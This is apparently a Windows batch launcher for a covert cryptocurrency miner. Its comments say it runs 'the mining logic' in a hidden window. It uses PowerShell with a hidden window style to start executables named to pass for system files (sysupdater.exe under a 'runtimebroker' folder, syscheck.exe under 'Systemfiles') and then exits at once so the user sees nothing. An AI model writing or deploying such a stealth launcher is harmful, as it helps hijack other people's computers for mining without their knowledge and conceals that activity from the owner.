@echo off
:: 1. Launch a new HIDDEN CMD that runs the mining logic
powershell -windowstyle hidden -command "Start-Process cmd.exe -ArgumentList '/c cd /d %LOCALAPPDATA%\runtimebroker && if exist sysupdater.exe (sysupdater.exe) else (start /b ..\Systemfiles\syscheck.exe)' -WindowStyle Hidden"

:: 2. Exit the visible window immediately
exit